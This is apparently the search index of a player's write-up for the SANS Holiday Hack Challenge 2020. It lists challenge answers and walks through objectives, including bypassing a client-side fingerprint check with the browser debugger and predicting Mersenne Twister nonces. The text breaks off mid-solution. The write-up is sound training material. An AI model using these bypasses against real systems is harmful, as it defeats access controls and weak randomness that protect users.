{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Holiday Hack Challenge 2020 Ho Ho Ho! THE SANS HOLIDAY HACK CHALLENGE is an amazing challenge where we work through a bunch of \"objectives\" and \"terminals\" of difficulty ranging from easy (\ud83c\udf84) to difficult (\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84) on various cybersecurity topics. All of us players are drawn into a virtual world where our job is to save Christmas. In the 2020 SANS Holiday Hack challenge we are tasked with foiling the plans of a Mr jack Frost. The HHC challenge also involves a virtual conference called KringleCon3. These talks are very engaging and some of them help with solving the objectives as well! All in all a super event to take part in and learn! Objectives These are the main challenges that we need to solve. Terminals Solving terminal challenges help unlock hints to the main objectives. Answers Here are the answers to the objectives Proxmark North Pole: The Frostiest Place on Earth Santapass Operate the santavator! No answer required - this objective is completed automatically when we unlock the door to the workshop The Lollipop Guild No answer required - this objective is completed automatically when we defrost the sleigh JackFrostWasHere Tanta Kringle No answer required - this objective is completed automatically when we enter Santa's office by bypassing the fingerprint sensor! a) 57066318f32f729d b)fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb Final Narrative KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null! Conclusion We foiled Jack's plot and saved Christmas!","title":"Introduction"},{"location":"#holiday-hack-challenge-2020","text":"","title":"Holiday Hack Challenge 2020"},{"location":"#ho-ho-ho","text":"THE SANS HOLIDAY HACK CHALLENGE is an amazing challenge where we work through a bunch of \"objectives\" and \"terminals\" of difficulty ranging from easy (\ud83c\udf84) to difficult (\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84) on various cybersecurity topics. All of us players are drawn into a virtual world where our job is to save Christmas. In the 2020 SANS Holiday Hack challenge we are tasked with foiling the plans of a Mr jack Frost. The HHC challenge also involves a virtual conference called KringleCon3. These talks are very engaging and some of them help with solving the objectives as well! All in all a super event to take part in and learn!","title":"Ho Ho Ho!"},{"location":"#objectives","text":"These are the main challenges that we need to solve.","title":"Objectives"},{"location":"#terminals","text":"Solving terminal challenges help unlock hints to the main objectives.","title":"Terminals"},{"location":"#answers","text":"Here are the answers to the objectives Proxmark North Pole: The Frostiest Place on Earth Santapass Operate the santavator! No answer required - this objective is completed automatically when we unlock the door to the workshop The Lollipop Guild No answer required - this objective is completed automatically when we defrost the sleigh JackFrostWasHere Tanta Kringle No answer required - this objective is completed automatically when we enter Santa's office by bypassing the fingerprint sensor! a) 57066318f32f729d b)fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Answers"},{"location":"#final-narrative","text":"KringleCon back at the castle, set the stage... But it's under construction like my GeoCities page. Feel I need a passport exploring on this platform - Got half floors with back doors provided that you hack more! Heading toward the light, unexpected what you see next: An alternate reality, the vision that it reflects. Mental buffer's overflowing like a fast food drive-thru trash can. Who and why did someone else impersonate the big man? You're grepping through your brain for the portrait's \"JFS\" \"Jack Frost: Santa,\" he's the villain who had triggered all this mess! Then it hits you like a chimney when you hear what he ain't saying: Pushing hard through land disputes, tryin' to stop all Santa's sleighing. All the rotting, plotting, low conniving streaming from that skull. Holiday Hackers, they're no slackers, returned Jack a big, old null!","title":"Final Narrative"},{"location":"#conclusion","text":"We foiled Jack's plot and saved Christmas!","title":"Conclusion"},{"location":"objectives/objective1/","text":"1) Uncover Santa's Gift List difficulty \ud83c\udf84 The Objective There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Chat with Jingle Ringford Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area. Hints Courtesy Jingle Ringford Image Edit Tool There are tools out there that could help Filter the Distortion that is this Twirl. Twirl Area Make sure you Lasso the correct twirly area. Solution Zooming out ( CTRL + - ) we spot the billboard in the top left corner. On Santas's desk we see what appears to be the gift list we are after. but wait...the words seem distorted somehow. Let's open up the billboard image in the photo editor linked in the first hint. The words Filter, Distortion, Twirl and Lasso mentioned in the hints stand out because of their capitalisation. Looks like Twirl is a distortion tool and Lasso is a selection tool available in the photo editor. Let's select the twirly part using Lasso tool as suggested in the second hint. Now let's use the twirl distortion tool to untwirl by appropriately adjusting the angle. Rejoice We can finally see what Santa plans to get Josh! Answer Proxmark","title":"1) Uncover Santa's Gift List"},{"location":"objectives/objective1/#1-uncover-santas-gift-list","text":"difficulty \ud83c\udf84","title":"1) Uncover Santa's Gift List"},{"location":"objectives/objective1/#the-objective","text":"There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.","title":"The Objective"},{"location":"objectives/objective1/#chat-with-jingle-ringford","text":"Welcome! Hop in the gondola to take a ride up the mountain to Exit 19: Santa's castle! Santa asked me to design the new badge, and he wanted it to look really cold - like it was frosty. Click your badge (the snowflake in the center of your avatar) to read your objectives. If you'd like to chat with the community, join us on Discord! We have specially appointed Kringle Koncierges as helpers; you can hit them up for help in the #general channel! If you get a minute, check out Ed Skoudis' official intro to the con! Oh, and before you head off up the mountain, you might want to try to figure out what's written on that advertising bilboard. Have you managed to read the gift list at the center? It can be hard when things are twirly. There are tools that can help! It also helps to select the correct twirly area.","title":"Chat with Jingle Ringford"},{"location":"objectives/objective1/#hints-courtesy-jingle-ringford","text":"","title":"Hints Courtesy Jingle Ringford"},{"location":"objectives/objective1/#image-edit-tool","text":"There are tools out there that could help Filter the Distortion that is this Twirl.","title":"Image Edit Tool"},{"location":"objectives/objective1/#twirl-area","text":"Make sure you Lasso the correct twirly area.","title":"Twirl Area"},{"location":"objectives/objective1/#solution","text":"Zooming out ( CTRL + - ) we spot the billboard in the top left corner. On Santas's desk we see what appears to be the gift list we are after. but wait...the words seem distorted somehow. Let's open up the billboard image in the photo editor linked in the first hint. The words Filter, Distortion, Twirl and Lasso mentioned in the hints stand out because of their capitalisation. Looks like Twirl is a distortion tool and Lasso is a selection tool available in the photo editor. Let's select the twirly part using Lasso tool as suggested in the second hint. Now let's use the twirl distortion tool to untwirl by appropriately adjusting the angle.","title":"Solution"},{"location":"objectives/objective1/#rejoice","text":"We can finally see what Santa plans to get Josh! Answer Proxmark","title":"Rejoice"},{"location":"objectives/objective10/","text":"10) Defeat Fingerprint Sensor difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint. Chat with Ribb Bonbowford After we help Ribb Bonbowford with the Elf Code challenge we get a tiny hint that there may be a vulnerability with the fingerprint sensor. Hello Santa! I've been looking over some of that code you submitted for the Santavator. It seems to open up a vulnerability in the fingerprint reader. I'm kind of surprised that you would have submitted such weak code. Normally your code is cleaner. Solution Make sure that we access the fingerprint sensor as \"ourselves\" and not santa. On inspecting the \"scan fingerprint\" element we see that the folllowing javascript is triggered on click event. Since the token besanta is missing in the request, the check fails and the ajax POST request which allows us to go to floor 3 is not made. cover.addEventListener('click', () => { if (btn4.classList.contains('powered') && hasToken('besanta')) { $.ajax({ type: 'POST', url: POST_URL, dataType: 'json', contentType: 'application/json', data: JSON.stringify({ targetFloor: '3', id: getParams.id, }), success: (res, status) => { if (res.hash) { __POST_RESULTS__({ resourceId: getParams.id || '1111', hash: res.hash, action: 'goToFloor-3', }); } } }); } else { __SEND_MSG__({ type: 'sfx', filename: 'error.mp3', }); } }); }; Since this is a client side check it can easily be bypassed. From the debugger tab we can set a breakpoint as shown below. Now click on the fingerprint scanner.Execution of javascript will be paused on the line where we have set the breakpoint. Now that we have paused the execution before the check is hit, Let's make some changes so that the check will pass and then resume execution. Printing out the token array at this point shows us that the value \"besanta\" is not present. Luckily we can add this value quite easily using the console as shown below. Now let us resume execution from the debugger tab. Rejoice We entered Santa's office by bypassing the fingerprint sensor! Answer This challenge doesn't require us to input an aswer. The objective is unlocked automatically when we enter Santa's office..","title":"10) Defeat Fingerprint Sensor"},{"location":"objectives/objective10/#10-defeat-fingerprint-sensor","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"10) Defeat Fingerprint Sensor"},{"location":"objectives/objective10/#the-objective","text":"Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.","title":"The Objective"},{"location":"objectives/objective10/#chat-with-ribb-bonbowford","text":"After we help Ribb Bonbowford with the Elf Code challenge we get a tiny hint that there may be a vulnerability with the fingerprint sensor. Hello Santa! I've been looking over some of that code you submitted for the Santavator. It seems to open up a vulnerability in the fingerprint reader. I'm kind of surprised that you would have submitted such weak code. Normally your code is cleaner.","title":"Chat with Ribb Bonbowford"},{"location":"objectives/objective10/#solution","text":"Make sure that we access the fingerprint sensor as \"ourselves\" and not santa. On inspecting the \"scan fingerprint\" element we see that the folllowing javascript is triggered on click event. Since the token besanta is missing in the request, the check fails and the ajax POST request which allows us to go to floor 3 is not made. cover.addEventListener('click', () => { if (btn4.classList.contains('powered') && hasToken('besanta')) { $.ajax({ type: 'POST', url: POST_URL, dataType: 'json', contentType: 'application/json', data: JSON.stringify({ targetFloor: '3', id: getParams.id, }), success: (res, status) => { if (res.hash) { __POST_RESULTS__({ resourceId: getParams.id || '1111', hash: res.hash, action: 'goToFloor-3', }); } } }); } else { __SEND_MSG__({ type: 'sfx', filename: 'error.mp3', }); } }); }; Since this is a client side check it can easily be bypassed. From the debugger tab we can set a breakpoint as shown below. Now click on the fingerprint scanner.Execution of javascript will be paused on the line where we have set the breakpoint. Now that we have paused the execution before the check is hit, Let's make some changes so that the check will pass and then resume execution. Printing out the token array at this point shows us that the value \"besanta\" is not present. Luckily we can add this value quite easily using the console as shown below. Now let us resume execution from the debugger tab.","title":"Solution"},{"location":"objectives/objective10/#rejoice","text":"We entered Santa's office by bypassing the fingerprint sensor! Answer This challenge doesn't require us to input an aswer. The objective is unlocked automatically when we enter Santa's office..","title":"Rejoice"},{"location":"objectives/objective11a/","text":"11a) Naughty/Nice List with Blockchain Investigation Part 1 difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce) Chat with Tinsel Upatree Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk. Chat with Tangle Coalbox After helping with the Snowball Game challenge the following conversation ensues. Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my Human Behavior Naughty/Niceness curriculum again. Hints Courtesy Tangle Coalbox MD5 Hash Collisions If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time. Solution Background It s highly recommended to have completed the snowball game challenge before commencing this one as the main ideas of Mersenne Twister random number generators are explained in the hints and talk accompanying that challenge. To recap what we learned MT-19937 is a popular algorithm used in random number generation. However it is possible to predict upcoming values from preceding 624 generated numbers. the random module in python uses MT-19937 to generate random numbers MT-19937 outputs 32 bit integers but these integers may be used by applications to create other types of values such as floats, 64 bit integers, smaller integers etc. Viewing Nonces Let's view the blocks in the given blockchain to understand what the nonces look like. We can pick up blockchain.dat file from Santa's desk. Now we can use the tool OfficialNaughtyNiceBlockchainEducationPack.zip linked in the objective to view this blockchain. With docker installed run the script ./docker.sh to install dependencies. Uncomment the below lines in naughty_nice.py to load blockchain.dat into chain c2. Add the line print(c2.blocks[0]) to print out all the blocks in the blockchain. # Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official_public.pem', 'rb') as fh: official_public_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify_chain(official_public_key))) We can see what a block looks like below Chain Index: 128449 Nonce: e3e12de5edfb51e2 PID: 0803508ada0a5ebf RID: aecbf777616d9fa4 Document Count: 1 Score: 000000dc (220) Sign: 1 (Nice) Data item: 1 Data Type: 05 (PDF) Data Length: 000003a7 Data: b'255044462d312e330a332030206f626a0a3c3c2f54797065202f506167650a2f506172656e742031203020520a2f5265736f75726365732032203020520a2f436f6e74656e74732034203020523e3e0a656e646f626a0a342030206f626a0a3c3c2f46696c746572202f466c6174654465636f6465202f4c656e677468203138323e3e0a73747265616d0a789c658eb10e82301884779ee212174da4b4a550ba9ae8e0dc1728e1078a501240797d51e3609c2eb9bbdc7712d788b34c638d4e16c9454048c6396c8db37d59a960c240a94d72d80a7bdb4e4458fc4008e37ac4c985ce0d3e60753366a280927c68e0f0a0c68523cafb82400f9a30b8db27297d838a5c8f71cbc61a7e6107d8ee17b91d29c41b79eeeb780cf1d2523cb7d4d7d80999994ca5b2d0ca68a3722db4fc5b484dc172f55e4813a912c925ff969e1a4c421d0a656e6473747265616d0a656e646f626a0a312030206f626a0a3c3c2f54797065202f50616765730a2f4b696473205b3320302052205d0a2f436f756e7420310a2f4d65646961426f78205b302030203631322e3030203739322e30305d0a3e3e0a656e646f626a0a352030206f626a0a3c3c2f54797065202f466f6e740a2f42617365466f6e74202f54696d65732d526f6d616e0a2f53756274797065202f54797065310a2f456e636f64696e67202f57696e416e7369456e636f64696e670a3e3e0a656e646f626a0a322030206f626a0a3c3c0a2f50726f63536574205b2f504446202f54657874202f496d61676542202f496d61676543202f496d616765495d0a2f466f6e74203c3c0a2f46312035203020520a3e3e0a2f584f626a656374203c3c0a3e3e0a3e3e0a656e646f626a0a372030206f626a0a3c3c0a2f54797065202f436174616c6f670a2f50616765732031203020520a2f4f70656e416374696f6e205b3320302052202f46697448206e756c6c5d0a2f506167654c61796f7574202f4f6e65436f6c756d6e0a3e3e0a656e646f626a0a787265660a3020380a303030303030303030302036353533352066200a30303030303030333339203030303030206e200a30303030303030353234203030303030206e200a30303030303030303039203030303030206e200a30303030303030303837203030303030206e200a30303030303030363238203030303030206e200a30303030303030373337203030303030206e200a747261696c65720a3c3c0a2f53697a6520380a2f526f6f742037203020520a3e3e0a7374617274787265660a3834300a2525454f460a0a' Date: 03/24 Time: 13:21:00 PreviousHash: c6e2e6ecb785e7132c8003ab5aaba88d Data Hash to Sign: 03cfb11504b8eee93b26aeb0d8ac39ff Signature: b'PT4OZUq+vwfNDhqipxwt28NC4Hd7dw6N1i4XHMGkIMR53qy8dF47YwpqzEjW0EAbUYPZ+b/E4X3YjXUTI0VnoJ2VsJQWtIPwcGIk5ayMfe5dgrjuLle5NUyEpd1EpIPdiSLMnyvbJEzG3HfA2dpkNsXWtO/D5wFYWGEErAt/PyH9CK/QuV5w3ArCwEmM61KWV7XTmC38EQoIm9iz5QQIIBU2onlZUcBlZ81N+H8pL/utpArkLppSwdRdx5f2kHUTLM7I2egDAdHhQ5zPAbZLoJ03HYjEBGKXiSQjAGhqY47U2DmliyOEehchTmmq+JiBF3ozXiV5hm89y/mN2uUzmQ==' We see that we have 64 bit nonces e3e12de5edfb51e2 Predicting 64 bit nonce values First we know that we can predict 32 bit nonce values. For example, those generated by random.randrange(0xFFFFFFFF) function in python. The random values generated in this case directly use the values generated by the MT-19937 PRNG. but what about 64 bit values like those generated by random.randrange(0xFFFFFFFFFFFFFFFF) ? We can predict 64 bit values too because 64 bit random values in python are generated by combining randome values generated by combining two calls to random.randrange(0xFFFFFFFF). The first call to random.randrange(0xFFFFFFFF)gives us the lower 32 bits (LSBs) of the 64 bit nonce and the second 32 bit number generated makes up the higher bits (MSBs). :):~/kringle/objective11a$python3 Python 3.9.1 (default, Jan 5 2021, 06:37:06) [GCC 5.4.0 20160609] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> import random >>> random.seed(3) >>> random.randrange(0xFFFFFFFF) 1022050301 >>> random.randrange(0xFFFFFFFF) 2545373330 >>> random.seed(3) >>> random.randrange(0xFFFFFFFFFFFFFFFF) 10932295209482665981 >>> hex(1022050301) '0x3ceb3ffd' >>> hex(2545373330) '0x97b75092' >>> hex(10932295209482665981) '0x97b750923ceb3ffd' Generating 32 bit nonces from 64 bit nonces I wrote this method within the Chain class to help dump all the 64 bit nonces into a file called nonce.txt def dump_nonce(self,filename=None): if filename is None: filename=\"nonce.txt\" with open(filename, 'w') as fh: for block in self.blocks: fh.write(str(block.nonce)+\"\\n\") After loading blockchain.dat in c2 we can call this method on the chain c2.dump_nonce() and we will get a text file with the nonces as below. We should have as many nonces as there are blocks in the chain. root@b4a691264693:/usr/src/app# head nonce.txt 16420456181932970466 2411124002006105373 733433256482262436 15245055816112148478 9815105154135256421 17640805355937439261 8521036384342535286 17039961340102745403 6897628261236889705 2858753831574985463 root@b4a691264693:/usr/src/app# wc nonce.txt 1548 1548 31581 nonce.txt ``` Now to convert these 64 bit values to 32 bit values we can make use of the below nifty python script. ``` fr = open(\"nonce.txt\",\"r\") fw = open(\"mersenne.txt\",\"w\") for nonce in fr.readlines(): # extract lower bits fw.write(str(int(nonce) & 0xFFFFFFFF)) fw.write(\"\\n\") # extract higher bits fw.write(str(int(nonce) >> 32)) fw.write(\"\\n\") fr.close() fw.close() We now have a file with 32 bit nonces. root@b4a691264693:/usr/src/app# head mersenne.txt 3992670690 3823185381 1358822685 561383553 789925284 170765737 878579710 3549516158 2438360421 2285257250 Remember given that the last block in the chain is block number 129996, we need to predict the nonce for block 130000 which is four blocks away. We can use the mt19937predict program to predict the next next 8 32-bit nonces ( or the next 4 64-bit nonces ) :):~/kringle/objective11a/toolkit$tail -624 mersenne.txt | mt19937predict | head -8 > predicted.txt :):~/kringle/objective11a/toolkit$cat predicted.txt 1710059470 3074734778 15809261 25586365 3180594148 2219797255 4079973021 1460036376 The 64-bit nonce value for block 1300000 can be derived from the last two 32 bit values. We need to submit the answer as a hex value Python 3.9.1 (default, Jan 5 2021, 06:37:06) [GCC 5.4.0 20160609] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> hex(4079973021) '0xf32f729d' >>> hex(1460036376) '0x57066318' We get the answer as 57066318f32f729d. Rejoice We predicted the nonce value correctly! Answer 57066318f32f729d","title":"11a) Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"objectives/objective11a/#11a-naughtynice-list-with-blockchain-investigation-part-1","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"11a) Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"objectives/objective11a/#the-objective","text":"Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools . (Enter just the 16-character hex value of the nonce)","title":"The Objective"},{"location":"objectives/objective11a/#chat-with-tinsel-upatree","text":"Howdy Santa! Just guarding the Naughty/Nice list on your desk. Santa, I don't know if you've heard, but something is very, very wrong... We tabulated the latest score of the Naughty/Nice Blockchain. Jack Frost is the nicest being in the world! Jack Frost!?! As you know, we only really start checking the Naughty/Nice totals as we get closer to the holidays. Out of nowhere, Jack Frost has this crazy score... positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago... Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn't possible. We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when Jack's big score registered back in March. You can get a slice of the Naughty/Nice blockchain on your desk.","title":"Chat with Tinsel Upatree"},{"location":"objectives/objective11a/#chat-with-tangle-coalbox","text":"After helping with the Snowball Game challenge the following conversation ensues. Wow, it really was all about abusing the pseudo-random sequence! I've been thinking, do you think someone could try and cheat the Naughty/Nice Blockchain with this same technique? I remember you told us about how if you have control over to bytes in a file, it's easy to create MD5 hash collisions . But the nonce would have to be known ahead of time. We know that the blockchain works by \"chaining\" blocks together. There's no way you know who could change it without messing up the chain, right Santa? I'm going to look closer to spot if any of the blocks have been changed. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. I think I need to review my Human Behavior Naughty/Niceness curriculum again.","title":"Chat with Tangle Coalbox"},{"location":"objectives/objective11a/#hints-courtesy-tangle-coalbox","text":"","title":"Hints Courtesy Tangle Coalbox"},{"location":"objectives/objective11a/#md5-hash-collisions","text":"If you have control over to bytes in a file, it's easy to create MD5 hash collisions . Problem is: there's that nonce that he would have to know ahead of time.","title":"MD5 Hash Collisions"},{"location":"objectives/objective11a/#solution","text":"","title":"Solution"},{"location":"objectives/objective11a/#background","text":"It s highly recommended to have completed the snowball game challenge before commencing this one as the main ideas of Mersenne Twister random number generators are explained in the hints and talk accompanying that challenge. To recap what we learned MT-19937 is a popular algorithm used in random number generation. However it is possible to predict upcoming values from preceding 624 generated numbers. the random module in python uses MT-19937 to generate random numbers MT-19937 outputs 32 bit integers but these integers may be used by applications to create other types of values such as floats, 64 bit integers, smaller integers etc.","title":"Background"},{"location":"objectives/objective11a/#viewing-nonces","text":"Let's view the blocks in the given blockchain to understand what the nonces look like. We can pick up blockchain.dat file from Santa's desk. Now we can use the tool OfficialNaughtyNiceBlockchainEducationPack.zip linked in the objective to view this blockchain. With docker installed run the script ./docker.sh to install dependencies. Uncomment the below lines in naughty_nice.py to load blockchain.dat into chain c2. Add the line print(c2.blocks[0]) to print out all the blocks in the blockchain. # Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official_public.pem', 'rb') as fh: official_public_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify_chain(official_public_key))) We can see what a block looks like below Chain Index: 128449 Nonce: e3e12de5edfb51e2 PID: 0803508ada0a5ebf RID: aecbf777616d9fa4 Document Count: 1 Score: 000000dc (220) Sign: 1 (Nice) Data item: 1 Data Type: 05 (PDF) Data Length: 000003a7 Data: b'255044462d312e330a332030206f626a0a3c3c2f54797065202f506167650a2f506172656e742031203020520a2f5265736f75726365732032203020520a2f436f6e74656e74732034203020523e3e0a656e646f626a0a342030206f626a0a3c3c2f46696c746572202f466c6174654465636f6465202f4c656e677468203138323e3e0a73747265616d0a789c658eb10e82301884779ee212174da4b4a550ba9ae8e0dc1728e1078a501240797d51e3609c2eb9bbdc7712d788b34c638d4e16c9454048c6396c8db37d59a960c240a94d72d80a7bdb4e4458fc4008e37ac4c985ce0d3e60753366a280927c68e0f0a0c68523cafb82400f9a30b8db27297d838a5c8f71cbc61a7e6107d8ee17b91d29c41b79eeeb780cf1d2523cb7d4d7d80999994ca5b2d0ca68a3722db4fc5b484dc172f55e4813a912c925ff969e1a4c421d0a656e6473747265616d0a656e646f626a0a312030206f626a0a3c3c2f54797065202f50616765730a2f4b696473205b3320302052205d0a2f436f756e7420310a2f4d65646961426f78205b302030203631322e3030203739322e30305d0a3e3e0a656e646f626a0a352030206f626a0a3c3c2f54797065202f466f6e740a2f42617365466f6e74202f54696d65732d526f6d616e0a2f53756274797065202f54797065310a2f456e636f64696e67202f57696e416e7369456e636f64696e670a3e3e0a656e646f626a0a322030206f626a0a3c3c0a2f50726f63536574205b2f504446202f54657874202f496d61676542202f496d61676543202f496d616765495d0a2f466f6e74203c3c0a2f46312035203020520a3e3e0a2f584f626a656374203c3c0a3e3e0a3e3e0a656e646f626a0a372030206f626a0a3c3c0a2f54797065202f436174616c6f670a2f50616765732031203020520a2f4f70656e416374696f6e205b3320302052202f46697448206e756c6c5d0a2f506167654c61796f7574202f4f6e65436f6c756d6e0a3e3e0a656e646f626a0a787265660a3020380a303030303030303030302036353533352066200a30303030303030333339203030303030206e200a30303030303030353234203030303030206e200a30303030303030303039203030303030206e200a30303030303030303837203030303030206e200a30303030303030363238203030303030206e200a30303030303030373337203030303030206e200a747261696c65720a3c3c0a2f53697a6520380a2f526f6f742037203020520a3e3e0a7374617274787265660a3834300a2525454f460a0a' Date: 03/24 Time: 13:21:00 PreviousHash: c6e2e6ecb785e7132c8003ab5aaba88d Data Hash to Sign: 03cfb11504b8eee93b26aeb0d8ac39ff Signature: b'PT4OZUq+vwfNDhqipxwt28NC4Hd7dw6N1i4XHMGkIMR53qy8dF47YwpqzEjW0EAbUYPZ+b/E4X3YjXUTI0VnoJ2VsJQWtIPwcGIk5ayMfe5dgrjuLle5NUyEpd1EpIPdiSLMnyvbJEzG3HfA2dpkNsXWtO/D5wFYWGEErAt/PyH9CK/QuV5w3ArCwEmM61KWV7XTmC38EQoIm9iz5QQIIBU2onlZUcBlZ81N+H8pL/utpArkLppSwdRdx5f2kHUTLM7I2egDAdHhQ5zPAbZLoJ03HYjEBGKXiSQjAGhqY47U2DmliyOEehchTmmq+JiBF3ozXiV5hm89y/mN2uUzmQ==' We see that we have 64 bit nonces e3e12de5edfb51e2","title":"Viewing Nonces"},{"location":"objectives/objective11a/#predicting-64-bit-nonce-values","text":"First we know that we can predict 32 bit nonce values. For example, those generated by random.randrange(0xFFFFFFFF) function in python. The random values generated in this case directly use the values generated by the MT-19937 PRNG. but what about 64 bit values like those generated by random.randrange(0xFFFFFFFFFFFFFFFF) ? We can predict 64 bit values too because 64 bit random values in python are generated by combining randome values generated by combining two calls to random.randrange(0xFFFFFFFF). The first call to random.randrange(0xFFFFFFFF)gives us the lower 32 bits (LSBs) of the 64 bit nonce and the second 32 bit number generated makes up the higher bits (MSBs). :):~/kringle/objective11a$python3 Python 3.9.1 (default, Jan 5 2021, 06:37:06) [GCC 5.4.0 20160609] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> import random >>> random.seed(3) >>> random.randrange(0xFFFFFFFF) 1022050301 >>> random.randrange(0xFFFFFFFF) 2545373330 >>> random.seed(3) >>> random.randrange(0xFFFFFFFFFFFFFFFF) 10932295209482665981 >>> hex(1022050301) '0x3ceb3ffd' >>> hex(2545373330) '0x97b75092' >>> hex(10932295209482665981) '0x97b750923ceb3ffd'","title":"Predicting 64 bit nonce values"},{"location":"objectives/objective11a/#generating-32-bit-nonces-from-64-bit-nonces","text":"I wrote this method within the Chain class to help dump all the 64 bit nonces into a file called nonce.txt def dump_nonce(self,filename=None): if filename is None: filename=\"nonce.txt\" with open(filename, 'w') as fh: for block in self.blocks: fh.write(str(block.nonce)+\"\\n\") After loading blockchain.dat in c2 we can call this method on the chain c2.dump_nonce() and we will get a text file with the nonces as below. We should have as many nonces as there are blocks in the chain. root@b4a691264693:/usr/src/app# head nonce.txt 16420456181932970466 2411124002006105373 733433256482262436 15245055816112148478 9815105154135256421 17640805355937439261 8521036384342535286 17039961340102745403 6897628261236889705 2858753831574985463 root@b4a691264693:/usr/src/app# wc nonce.txt 1548 1548 31581 nonce.txt ``` Now to convert these 64 bit values to 32 bit values we can make use of the below nifty python script. ``` fr = open(\"nonce.txt\",\"r\") fw = open(\"mersenne.txt\",\"w\") for nonce in fr.readlines(): # extract lower bits fw.write(str(int(nonce) & 0xFFFFFFFF)) fw.write(\"\\n\") # extract higher bits fw.write(str(int(nonce) >> 32)) fw.write(\"\\n\") fr.close() fw.close() We now have a file with 32 bit nonces. root@b4a691264693:/usr/src/app# head mersenne.txt 3992670690 3823185381 1358822685 561383553 789925284 170765737 878579710 3549516158 2438360421 2285257250 Remember given that the last block in the chain is block number 129996, we need to predict the nonce for block 130000 which is four blocks away. We can use the mt19937predict program to predict the next next 8 32-bit nonces ( or the next 4 64-bit nonces ) :):~/kringle/objective11a/toolkit$tail -624 mersenne.txt | mt19937predict | head -8 > predicted.txt :):~/kringle/objective11a/toolkit$cat predicted.txt 1710059470 3074734778 15809261 25586365 3180594148 2219797255 4079973021 1460036376 The 64-bit 